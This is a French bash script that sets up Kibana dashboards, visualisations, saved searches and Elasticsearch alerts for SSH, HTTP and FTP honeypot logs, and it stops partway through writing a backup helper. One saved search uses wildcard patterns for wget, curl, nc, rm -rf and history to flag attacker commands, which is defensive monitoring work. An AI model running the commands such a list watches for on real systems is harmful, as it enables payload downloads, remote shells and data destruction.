#!/bin/bash

# ==============================================================================
# CONFIGURATION COMPLÈTE DES DASHBOARDS KIBANA POUR HONEYPOTS
# ==============================================================================
# Script complet pour créer tous les dashboards, visualisations et index patterns
# À exécuter sur la VM ELK (192.168.2.124)

# Configuration
KIBANA_URL="http://192.168.2.124:5601"
ES_URL="http://192.168.2.124:9200"

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_header() {
    echo -e "${PURPLE}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  $1
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
${NC}"
}

print_section() {
    echo -e "${CYAN}
┌─────────────────────────────────────────────────────────────────────────────┐
│ $1
└─────────────────────────────────────────────────────────────────────────────┘${NC}"
}

# ==============================================================================
# ÉTAPE 1 : VÉRIFICATIONS PRÉLIMINAIRES
# ==============================================================================

print_header "CONFIGURATION DASHBOARDS KIBANA POUR HONEYPOTS"

print_section "1. VÉRIFICATIONS PRÉLIMINAIRES"

# Vérifier qu'on est sur la bonne VM ELK
CURRENT_IP=$(ip route get 8.8.8.8 | awk '{print $7}' | head -1)
if [ "$CURRENT_IP" != "192.168.2.124" ]; then
    print_error "Ce script doit être exécuté sur la VM ELK (192.168.2.124)"
    print_error "IP actuelle: $CURRENT_IP"
    exit 1
fi

print_success "✓ Exécution sur la VM ELK ($CURRENT_IP)"

# Vérifier les services ELK
print_status "Vérification des services ELK..."

SERVICES_OK=0
for service in elasticsearch logstash kibana; do
    if systemctl is-active "$service" >/dev/null 2>&1; then
        print_success "✓ $service actif"
        ((SERVICES_OK++))
    else
        print_error "❌ $service inactif"
    fi
done

if [ "$SERVICES_OK" -lt 3 ]; then
    print_error "Services ELK manquants. Vérifiez l'installation."
    exit 1
fi

# Vérifier l'accès Kibana
print_status "Test d'accès à Kibana..."
KIBANA_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$KIBANA_URL/api/status")

if [ "$KIBANA_STATUS" = "200" ]; then
    print_success "✓ Kibana accessible (HTTP $KIBANA_STATUS)"
else
    print_error "❌ Kibana non accessible (HTTP $KIBANA_STATUS)"
    exit 1
fi

# Vérifier la présence de données
print_status "Vérification des données Elasticsearch..."
TOTAL_DOCS=$(curl -s "$ES_URL/honeypot-*/_count" 2>/dev/null | jq -r '.count // 0')
print_status "Documents honeypot trouvés: $TOTAL_DOCS"

if [ "$TOTAL_DOCS" -eq 0 ]; then
    print_warning "⚠ Aucune donnée honeypot trouvée"
    print_status "Génération de données de test..."
    
    # Injecter quelques données de test
    TODAY=$(date +%Y.%m.%d)
    for type in cowrie http ftp; do
        curl -X POST "$ES_URL/honeypot-$type-$TODAY/_doc" -H "Content-Type: application/json" -d '{
            "@timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'",
            "honeypot_type": "'$type'",
            "event_type": "test_data",
            "client_ip": "203.0.113.100",
            "severity": "medium",
            "message": "Test data for dashboards"
        }' >/dev/null 2>&1
    done
    
    sleep 2
    TOTAL_DOCS=$(curl -s "$ES_URL/honeypot-*/_count" 2>/dev/null | jq -r '.count // 0')
    print_success "✓ $TOTAL_DOCS documents de test créés"
fi

# ==============================================================================
# ÉTAPE 2 : CRÉATION DES INDEX PATTERNS
# ==============================================================================

print_section "2. CRÉATION DES INDEX PATTERNS"

print_status "Création des index patterns Kibana..."

# Fonction pour créer un index pattern
create_index_pattern() {
    local pattern_name="$1"
    local pattern_title="$2"
    local time_field="$3"
    
    print_status "Création de l'index pattern: $pattern_title"
    
    curl -X POST "$KIBANA_URL/api/saved_objects/index-pattern/$pattern_name" \
         -H "Content-Type: application/json" \
         -H "kbn-xsrf: true" \
         -d '{
           "attributes": {
             "title": "'$pattern_title'",
             "timeFieldName": "'$time_field'"
           }
         }' >/dev/null 2>&1
    
    if [ $? -eq 0 ]; then
        print_success "  ✓ $pattern_title créé"
    else
        print_warning "  ⚠ $pattern_title existe déjà ou erreur"
    fi
}

# Créer les index patterns principaux
create_index_pattern "honeypot-all" "honeypot-*" "@timestamp"
create_index_pattern "honeypot-ssh" "honeypot-cowrie-*" "@timestamp"
create_index_pattern "honeypot-http" "honeypot-http-*" "@timestamp"
create_index_pattern "honeypot-ftp" "honeypot-ftp-*" "@timestamp"

# Définir l'index pattern par défaut
print_status "Définition de l'index pattern par défaut..."
curl -X POST "$KIBANA_URL/api/kibana/settings/defaultIndex" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{"value": "honeypot-all"}' >/dev/null 2>&1

print_success "✓ Index patterns créés"

# ==============================================================================
# ÉTAPE 3 : CRÉATION DES VISUALISATIONS
# ==============================================================================

print_section "3. CRÉATION DES VISUALISATIONS"

print_status "Création des visualisations Kibana..."

# Attendre que Kibana traite les index patterns
sleep 5

# 1. TOP 10 IP SOURCES ATTAQUANTES
print_status "  Création: Top 10 IP sources attaquantes..."
curl -X POST "$KIBANA_URL/api/saved_objects/visualization" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🔥 Top 10 IP Sources Attaquantes",
         "visState": "{\"title\":\"🔥 Top 10 IP Sources Attaquantes\",\"type\":\"horizontal_bar\",\"params\":{\"grid\":{\"categoryLines\":false,\"style\":{\"color\":\"#eee\"}},\"categoryAxes\":[{\"id\":\"CategoryAxis-1\",\"type\":\"category\",\"position\":\"left\",\"show\":true,\"style\":{},\"scale\":{\"type\":\"linear\"},\"labels\":{\"show\":true,\"truncate\":100},\"title\":{}}],\"valueAxes\":[{\"id\":\"ValueAxis-1\",\"name\":\"LeftAxis-1\",\"type\":\"value\",\"position\":\"bottom\",\"show\":true,\"style\":{},\"scale\":{\"type\":\"linear\",\"mode\":\"normal\"},\"labels\":{\"show\":true,\"rotate\":0,\"filter\":false,\"truncate\":100},\"title\":{\"text\":\"Count\"}}],\"seriesParams\":[{\"show\":true,\"type\":\"histogram\",\"mode\":\"stacked\",\"data\":{\"label\":\"Count\",\"id\":\"1\"},\"valueAxis\":\"ValueAxis-1\",\"drawLinesBetweenPoints\":true,\"showCircles\":true}],\"addTooltip\":true,\"addLegend\":true,\"legendPosition\":\"right\",\"times\":[],\"addTimeMarker\":false},\"aggs\":[{\"id\":\"1\",\"enabled\":true,\"type\":\"count\",\"schema\":\"metric\",\"params\":{}},{\"id\":\"2\",\"enabled\":true,\"type\":\"terms\",\"schema\":\"segment\",\"params\":{\"field\":\"client_ip.keyword\",\"size\":10,\"order\":\"desc\",\"orderBy\":\"1\",\"otherBucket\":false,\"otherBucketLabel\":\"Other\",\"missingBucket\":false,\"missingBucketLabel\":\"Missing\"}}]}",
         "uiStateJSON": "{}",
         "description": "Top 10 des adresses IP sources qui attaquent le plus les honeypots",
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-all\",\"query\":{\"match_all\":{}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# 2. TIMELINE DES ATTAQUES PAR TYPE DE HONEYPOT
print_status "  Création: Timeline des attaques par honeypot..."
curl -X POST "$KIBANA_URL/api/saved_objects/visualization" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "📊 Timeline Attaques par Type Honeypot",
         "visState": "{\"title\":\"📊 Timeline Attaques par Type Honeypot\",\"type\":\"line\",\"params\":{\"grid\":{\"categoryLines\":false,\"style\":{\"color\":\"#eee\"}},\"categoryAxes\":[{\"id\":\"CategoryAxis-1\",\"type\":\"category\",\"position\":\"bottom\",\"show\":true,\"style\":{},\"scale\":{\"type\":\"linear\"},\"labels\":{\"show\":true,\"truncate\":100},\"title\":{}}],\"valueAxes\":[{\"id\":\"ValueAxis-1\",\"name\":\"LeftAxis-1\",\"type\":\"value\",\"position\":\"left\",\"show\":true,\"style\":{},\"scale\":{\"type\":\"linear\",\"mode\":\"normal\"},\"labels\":{\"show\":true,\"rotate\":0,\"filter\":false,\"truncate\":100},\"title\":{\"text\":\"Count\"}}],\"seriesParams\":[{\"show\":\"true\",\"type\":\"line\",\"mode\":\"normal\",\"data\":{\"label\":\"Count\",\"id\":\"1\"},\"valueAxis\":\"ValueAxis-1\",\"drawLinesBetweenPoints\":true,\"showCircles\":true}],\"addTooltip\":true,\"addLegend\":true,\"legendPosition\":\"right\",\"times\":[],\"addTimeMarker\":false},\"aggs\":[{\"id\":\"1\",\"enabled\":true,\"type\":\"count\",\"schema\":\"metric\",\"params\":{}},{\"id\":\"2\",\"enabled\":true,\"type\":\"date_histogram\",\"schema\":\"segment\",\"params\":{\"field\":\"@timestamp\",\"interval\":\"auto\",\"customInterval\":\"2h\",\"min_doc_count\":1,\"extended_bounds\":{}}},{\"id\":\"3\",\"enabled\":true,\"type\":\"terms\",\"schema\":\"group\",\"params\":{\"field\":\"honeypot_type.keyword\",\"size\":5,\"order\":\"desc\",\"orderBy\":\"1\",\"otherBucket\":false,\"otherBucketLabel\":\"Other\",\"missingBucket\":false,\"missingBucketLabel\":\"Missing\"}}]}",
         "uiStateJSON": "{}",
         "description": "Évolution temporelle des attaques par type de honeypot (SSH, HTTP, FTP)",
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-all\",\"query\":{\"match_all\":{}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# 3. RÉPARTITION DES NIVEAUX DE SÉVÉRITÉ
print_status "  Création: Répartition des niveaux de sévérité..."
curl -X POST "$KIBANA_URL/api/saved_objects/visualization" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "⚠️ Répartition Niveaux de Sévérité",
         "visState": "{\"title\":\"⚠️ Répartition Niveaux de Sévérité\",\"type\":\"pie\",\"params\":{\"addTooltip\":true,\"addLegend\":true,\"legendPosition\":\"right\",\"isDonut\":true,\"labels\":{\"show\":false,\"values\":true,\"last_level\":true,\"truncate\":100}},\"aggs\":[{\"id\":\"1\",\"enabled\":true,\"type\":\"count\",\"schema\":\"metric\",\"params\":{}},{\"id\":\"2\",\"enabled\":true,\"type\":\"terms\",\"schema\":\"segment\",\"params\":{\"field\":\"severity.keyword\",\"size\":5,\"order\":\"desc\",\"orderBy\":\"1\",\"otherBucket\":false,\"otherBucketLabel\":\"Other\",\"missingBucket\":false,\"missingBucketLabel\":\"Missing\"}}]}",
         "uiStateJSON": "{}",
         "description": "Distribution des attaques par niveau de sévérité (critical, high, medium, low)",
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-all\",\"query\":{\"match_all\":{}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# 4. TOP PAYS SOURCES DES ATTAQUES
print_status "  Création: Top pays sources des attaques..."
curl -X POST "$KIBANA_URL/api/saved_objects/visualization" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🌍 Top Pays Sources des Attaques",
         "visState": "{\"title\":\"🌍 Top Pays Sources des Attaques\",\"type\":\"table\",\"params\":{\"perPage\":10,\"showPartialRows\":false,\"showMeticsAtAllLevels\":false,\"sort\":{\"columnIndex\":null,\"direction\":null},\"showTotal\":false,\"totalFunc\":\"sum\"},\"aggs\":[{\"id\":\"1\",\"enabled\":true,\"type\":\"count\",\"schema\":\"metric\",\"params\":{}},{\"id\":\"2\",\"enabled\":true,\"type\":\"terms\",\"schema\":\"bucket\",\"params\":{\"field\":\"geoip.country_name.keyword\",\"size\":10,\"order\":\"desc\",\"orderBy\":\"1\",\"otherBucket\":false,\"otherBucketLabel\":\"Other\",\"missingBucket\":false,\"missingBucketLabel\":\"Missing\"}}]}",
         "uiStateJSON": "{}",
         "description": "Classement des pays par nombre d'attaques générées",
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-all\",\"query\":{\"match_all\":{}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# 5. MÉTRIQUE TOTAL ATTAQUES EN TEMPS RÉEL
print_status "  Création: Métrique total attaques..."
curl -X POST "$KIBANA_URL/api/saved_objects/visualization" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🎯 Total Attaques Temps Réel",
         "visState": "{\"title\":\"🎯 Total Attaques Temps Réel\",\"type\":\"metric\",\"params\":{\"addTooltip\":true,\"addLegend\":false,\"type\":\"metric\",\"metric\":{\"percentageMode\":false,\"useRanges\":false,\"colorSchema\":\"Green to Red\",\"metricColorMode\":\"None\",\"colorsRange\":[{\"from\":0,\"to\":10000}],\"labels\":{\"show\":true},\"invertColors\":false,\"style\":{\"bgFill\":\"#000\",\"bgColor\":false,\"labelColor\":false,\"subText\":\"\",\"fontSize\":60}}},\"aggs\":[{\"id\":\"1\",\"enabled\":true,\"type\":\"count\",\"schema\":\"metric\",\"params\":{}}]}",
         "uiStateJSON": "{}",
         "description": "Nombre total d'attaques détectées en temps réel",
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-all\",\"query\":{\"match_all\":{}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# 6. TOP COMMANDES SSH MALVEILLANTES
print_status "  Création: Top commandes SSH malveillantes..."
curl -X POST "$KIBANA_URL/api/saved_objects/visualization" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "💻 Top Commandes SSH Malveillantes",
         "visState": "{\"title\":\"💻 Top Commandes SSH Malveillantes\",\"type\":\"table\",\"params\":{\"perPage\":15,\"showPartialRows\":false,\"showMeticsAtAllLevels\":false,\"sort\":{\"columnIndex\":null,\"direction\":null},\"showTotal\":false,\"totalFunc\":\"sum\"},\"aggs\":[{\"id\":\"1\",\"enabled\":true,\"type\":\"count\",\"schema\":\"metric\",\"params\":{}},{\"id\":\"2\",\"enabled\":true,\"type\":\"terms\",\"schema\":\"bucket\",\"params\":{\"field\":\"input.keyword\",\"size\":20,\"order\":\"desc\",\"orderBy\":\"1\",\"otherBucket\":false,\"otherBucketLabel\":\"Other\",\"missingBucket\":false,\"missingBucketLabel\":\"Missing\"}}]}",
         "uiStateJSON": "{}",
         "description": "Commandes les plus exécutées dans le honeypot SSH",
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-ssh\",\"query\":{\"bool\":{\"must\":[{\"exists\":{\"field\":\"input\"}}]}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# 7. CARTE GÉOGRAPHIQUE DES ATTAQUES
print_status "  Création: Carte géographique des attaques..."
curl -X POST "$KIBANA_URL/api/saved_objects/visualization" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🗺️ Carte Géographique des Attaques",
         "visState": "{\"title\":\"🗺️ Carte Géographique des Attaques\",\"type\":\"tile_map\",\"params\":{\"colorSchema\":\"Yellow to Red\",\"mapType\":\"Scaled Circle Markers\",\"isDesaturated\":true,\"addTooltip\":true,\"heatClusterSize\":1.5,\"legendPosition\":\"bottomright\",\"mapZoom\":2,\"mapCenter\":[0,0],\"wms\":{\"enabled\":false,\"url\":\"https://basemap.nationalmap.gov/arcgis/services/USGSTopo/MapServer/WMSServer\",\"options\":{\"version\":\"1.3.0\",\"layers\":\"0\",\"format\":\"image/png\",\"transparent\":true,\"attribution\":\"Maps provided by USGS\",\"styles\":\"\"}}},\"aggs\":[{\"id\":\"1\",\"enabled\":true,\"type\":\"count\",\"schema\":\"metric\",\"params\":{}},{\"id\":\"2\",\"enabled\":true,\"type\":\"geohash_grid\",\"schema\":\"segment\",\"params\":{\"field\":\"geoip.location\",\"autoPrecision\":true,\"precision\":2}}]}",
         "uiStateJSON": "{\"mapZoom\":2,\"mapCenter\":[0,0]}",
         "description": "Visualisation géographique des sources d'attaques",
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-all\",\"query\":{\"bool\":{\"must\":[{\"exists\":{\"field\":\"geoip.location\"}}]}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# 8. TYPES D'ATTAQUES HTTP
print_status "  Création: Types d'attaques HTTP..."
curl -X POST "$KIBANA_URL/api/saved_objects/visualization" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🌐 Types d'Attaques HTTP Détectées",
         "visState": "{\"title\":\"🌐 Types d'Attaques HTTP Détectées\",\"type\":\"histogram\",\"params\":{\"grid\":{\"categoryLines\":false,\"style\":{\"color\":\"#eee\"}},\"categoryAxes\":[{\"id\":\"CategoryAxis-1\",\"type\":\"category\",\"position\":\"bottom\",\"show\":true,\"style\":{},\"scale\":{\"type\":\"linear\"},\"labels\":{\"show\":true,\"truncate\":100},\"title\":{}}],\"valueAxes\":[{\"id\":\"ValueAxis-1\",\"name\":\"LeftAxis-1\",\"type\":\"value\",\"position\":\"left\",\"show\":true,\"style\":{},\"scale\":{\"type\":\"linear\",\"mode\":\"normal\"},\"labels\":{\"show\":true,\"rotate\":0,\"filter\":false,\"truncate\":100},\"title\":{\"text\":\"Count\"}}],\"seriesParams\":[{\"show\":\"true\",\"type\":\"histogram\",\"mode\":\"stacked\",\"data\":{\"label\":\"Count\",\"id\":\"1\"},\"valueAxis\":\"ValueAxis-1\",\"drawLinesBetweenPoints\":true,\"showCircles\":true}],\"addTooltip\":true,\"addLegend\":true,\"legendPosition\":\"right\",\"times\":[],\"addTimeMarker\":false},\"aggs\":[{\"id\":\"1\",\"enabled\":true,\"type\":\"count\",\"schema\":\"metric\",\"params\":{}},{\"id\":\"2\",\"enabled\":true,\"type\":\"terms\",\"schema\":\"segment\",\"params\":{\"field\":\"attack_type.keyword\",\"size\":10,\"order\":\"desc\",\"orderBy\":\"1\",\"otherBucket\":false,\"otherBucketLabel\":\"Other\",\"missingBucket\":false,\"missingBucketLabel\":\"Missing\"}}]}",
         "uiStateJSON": "{}",
         "description": "Distribution des types d'attaques HTTP (SQL injection, XSS, etc.)",
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-http\",\"query\":{\"bool\":{\"must\":[{\"exists\":{\"field\":\"attack_type\"}}]}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

print_success "✓ 8 visualisations créées"

# ==============================================================================
# ÉTAPE 4 : CRÉATION DES DASHBOARDS
# ==============================================================================

print_section "4. CRÉATION DES DASHBOARDS"

print_status "Création des dashboards principaux..."

# Attendre que les visualisations soient traitées
sleep 3

# Dashboard principal - Vue d'ensemble
print_status "  Création: Dashboard principal - Vue d'ensemble..."
curl -X POST "$KIBANA_URL/api/saved_objects/dashboard" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🎯 Honeypot Security Dashboard - Vue d'\''Ensemble",
         "hits": 0,
         "description": "Dashboard principal pour l'\''analyse des attaques honeypot - Vue globale SSH, HTTP, FTP",
         "panelsJSON": "[]",
         "optionsJSON": "{\"useMargins\":true,\"syncColors\":false,\"hidePanelTitles\":false}",
         "version": 1,
         "timeRestore": false,
         "timeTo": "now",
         "timeFrom": "now-24h",
         "refreshInterval": {
           "pause": false,
           "value": 30000
         },
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"query\":{\"match_all\":{}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# Dashboard SSH spécialisé
print_status "  Création: Dashboard SSH spécialisé..."
curl -X POST "$KIBANA_URL/api/saved_objects/dashboard" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🔐 SSH Honeypot Analysis Dashboard",
         "hits": 0,
         "description": "Analyse détaillée des attaques SSH - Cowrie honeypot",
         "panelsJSON": "[]",
         "optionsJSON": "{\"useMargins\":true,\"syncColors\":false,\"hidePanelTitles\":false}",
         "version": 1,
         "timeRestore": false,
         "timeTo": "now",
         "timeFrom": "now-7d",
         "refreshInterval": {
           "pause": false,
           "value": 60000
         },
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"honeypot_type\":\"ssh\"}}]}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# Dashboard HTTP spécialisé
print_status "  Création: Dashboard HTTP spécialisé..."
curl -X POST "$KIBANA_URL/api/saved_objects/dashboard" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🌐 HTTP Honeypot Analysis Dashboard",
         "hits": 0,
         "description": "Analyse détaillée des attaques HTTP - Web honeypot",
         "panelsJSON": "[]",
         "optionsJSON": "{\"useMargins\":true,\"syncColors\":false,\"hidePanelTitles\":false}",
         "version": 1,
         "timeRestore": false,
         "timeTo": "now",
         "timeFrom": "now-7d",
         "refreshInterval": {
           "pause": false,
           "value": 60000
         },
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"honeypot_type\":\"http\"}}]}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# Dashboard temps réel
print_status "  Création: Dashboard temps réel..."
curl -X POST "$KIBANA_URL/api/saved_objects/dashboard" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "⚡ Real-Time Attack Monitoring",
         "hits": 0,
         "description": "Monitoring en temps réel des attaques - Toutes sources",
         "panelsJSON": "[]",
         "optionsJSON": "{\"useMargins\":true,\"syncColors\":false,\"hidePanelTitles\":false}",
         "version": 1,
         "timeRestore": false,
         "timeTo": "now",
         "timeFrom": "now-15m",
         "refreshInterval": {
           "pause": false,
           "value": 10000
         },
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"query\":{\"match_all\":{}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

print_success "✓ 4 dashboards créés"

# ==============================================================================
# ÉTAPE 5 : CRÉATION DES RECHERCHES SAUVEGARDÉES
# ==============================================================================

print_section "5. CRÉATION DES RECHERCHES SAUVEGARDÉES"

print_status "Création des recherches prédéfinies..."

# Recherche: Attaques critiques
print_status "  Création: Recherche attaques critiques..."
curl -X POST "$KIBANA_URL/api/saved_objects/search" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🚨 Attaques Critiques",
         "description": "Toutes les attaques de sévérité critique",
         "hits": 0,
         "columns": ["@timestamp", "honeypot_type", "client_ip", "attack_type", "message"],
         "sort": [["@timestamp", "desc"]],
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-all\",\"query\":{\"bool\":{\"must\":[{\"term\":{\"severity\":\"critical\"}}]}},\"filter\":[],\"highlight\":{\"pre_tags\":[\"@kibana-highlighted-field@\"],\"post_tags\":[\"@/kibana-highlighted-field@\"],\"fields\":{\"*\":{}},\"fragment_size\":2147483647}}"
         }
       }
     }' >/dev/null 2>&1

# Recherche: Brute force SSH
print_status "  Création: Recherche brute force SSH..."
curl -X POST "$KIBANA_URL/api/saved_objects/search" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🔐 Brute Force SSH",
         "description": "Tentatives de connexion SSH échouées",
         "hits": 0,
         "columns": ["@timestamp", "src_ip", "username", "password", "eventid"],
         "sort": [["@timestamp", "desc"]],
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-ssh\",\"query\":{\"bool\":{\"must\":[{\"term\":{\"eventid\":\"cowrie.login.failed\"}}]}},\"filter\":[],\"highlight\":{\"pre_tags\":[\"@kibana-highlighted-field@\"],\"post_tags\":[\"@/kibana-highlighted-field@\"],\"fields\":{\"*\":{}},\"fragment_size\":2147483647}}"
         }
       }
     }' >/dev/null 2>&1

# Recherche: Commandes malveillantes
print_status "  Création: Recherche commandes malveillantes..."
curl -X POST "$KIBANA_URL/api/saved_objects/search" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "💻 Commandes Malveillantes",
         "description": "Commandes suspectes exécutées dans les honeypots",
         "hits": 0,
         "columns": ["@timestamp", "src_ip", "input", "honeypot_type"],
         "sort": [["@timestamp", "desc"]],
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-all\",\"query\":{\"bool\":{\"should\":[{\"wildcard\":{\"input\":\"*wget*\"}},{\"wildcard\":{\"input\":\"*curl*\"}},{\"wildcard\":{\"input\":\"*nc*\"}},{\"wildcard\":{\"input\":\"*rm -rf*\"}},{\"wildcard\":{\"input\":\"*history*\"}}]}},\"filter\":[],\"highlight\":{\"pre_tags\":[\"@kibana-highlighted-field@\"],\"post_tags\":[\"@/kibana-highlighted-field@\"],\"fields\":{\"*\":{}},\"fragment_size\":2147483647}}"
         }
       }
     }' >/dev/null 2>&1

# Recherche: Attaques par pays
print_status "  Création: Recherche attaques par pays..."
curl -X POST "$KIBANA_URL/api/saved_objects/search" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🌍 Attaques par Pays",
         "description": "Attaques groupées par pays d'\''origine",
         "hits": 0,
         "columns": ["@timestamp", "client_ip", "geoip.country_name", "geoip.city_name", "honeypot_type"],
         "sort": [["@timestamp", "desc"]],
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-all\",\"query\":{\"bool\":{\"must\":[{\"exists\":{\"field\":\"geoip.country_name\"}}]}},\"filter\":[],\"highlight\":{\"pre_tags\":[\"@kibana-highlighted-field@\"],\"post_tags\":[\"@/kibana-highlighted-field@\"],\"fields\":{\"*\":{}},\"fragment_size\":2147483647}}"
         }
       }
     }' >/dev/null 2>&1

print_success "✓ 4 recherches sauvegardées créées"

# ==============================================================================
# ÉTAPE 6 : CONFIGURATION DES ALERTES ET WATCHERS
# ==============================================================================

print_section "6. CONFIGURATION DES ALERTES"

print_status "Configuration des alertes Elasticsearch..."

# Créer un watcher pour les attaques critiques
print_status "  Création: Alerte attaques critiques..."
curl -X PUT "$ES_URL/_watcher/watch/critical_attacks_alert" \
     -H "Content-Type: application/json" \
     -d '{
       "trigger": {
         "schedule": {
           "interval": "5m"
         }
       },
       "input": {
         "search": {
           "request": {
             "search_type": "query_then_fetch",
             "indices": ["honeypot-*"],
             "body": {
               "query": {
                 "bool": {
                   "must": [
                     {"term": {"severity": "critical"}},
                     {"range": {"@timestamp": {"gte": "now-5m"}}}
                   ]
                 }
               }
             }
           }
         }
       },
       "condition": {
         "compare": {
           "ctx.payload.hits.total": {
             "gt": 5
           }
         }
       },
       "actions": {
         "log_alert": {
           "logging": {
             "level": "warn",
             "text": "ALERTE: {{ctx.payload.hits.total}} attaques critiques détectées en 5 minutes"
           }
         }
       }
     }' >/dev/null 2>&1

# Créer un watcher pour le brute force
print_status "  Création: Alerte brute force..."
curl -X PUT "$ES_URL/_watcher/watch/brute_force_alert" \
     -H "Content-Type: application/json" \
     -d '{
       "trigger": {
         "schedule": {
           "interval": "2m"
         }
       },
       "input": {
         "search": {
           "request": {
             "search_type": "query_then_fetch",
             "indices": ["honeypot-*"],
             "body": {
               "query": {
                 "bool": {
                   "must": [
                     {"wildcard": {"eventid": "*login.failed*"}},
                     {"range": {"@timestamp": {"gte": "now-2m"}}}
                   ]
                 }
               },
               "aggs": {
                 "by_ip": {
                   "terms": {
                     "field": "src_ip.keyword",
                     "min_doc_count": 10
                   }
                 }
               }
             }
           }
         }
       },
       "condition": {
         "compare": {
           "ctx.payload.aggregations.by_ip.buckets.0.doc_count": {
             "gt": 10
           }
         }
       },
       "actions": {
         "log_alert": {
           "logging": {
             "level": "warn",
             "text": "ALERTE BRUTE FORCE: IP {{ctx.payload.aggregations.by_ip.buckets.0.key}} avec {{ctx.payload.aggregations.by_ip.buckets.0.doc_count}} tentatives"
           }
         }
       }
     }' >/dev/null 2>&1

print_success "✓ Alertes Elasticsearch configurées"

# ==============================================================================
# ÉTAPE 7 : SCRIPTS UTILITAIRES POUR LES DASHBOARDS
# ==============================================================================

print_section "7. CRÉATION DES SCRIPTS UTILITAIRES"

print_status "Création des scripts de gestion des dashboards..."

# Script de sauvegarde complète
cat > /opt/elk-scripts/backup_all_kibana_objects.sh << 'EOF'
#!/bin/bash
echo "=== Sauvegarde complète des objets Kibana ==="

KIBANA_URL="http://192.168.2.124:5601"
BACKUP_DIR="/opt/kibana-backups"
DATE=$(date +%Y%m%d_%H%M%S)

mkdir -p "$BACKUP_DIR"

echo "Sauvegarde de tous les objets Kibana..."
curl -X POST "${KIBANA_URL}/api/saved_objects/_export" \
  -H "Content-Type: application/json" \
  -H "kbn-xsrf: true" \
  -d '{
    "type": ["dashboard", "visualization", "index-pattern", "search"],
    "includeReferencesDeep": true
  }' > "${BACKUP_DIR}/kibana-complete-backup-${DATE}.ndjson"

if [ $? -eq 0 ]; then
    echo "✅ Sauvegarde terminée: ${BACKUP_DIR}/kibana-complete-backup-${DATE}.ndjson"
else
    echo "❌ Erreur lors de la sauvegarde"
fi

# Compression
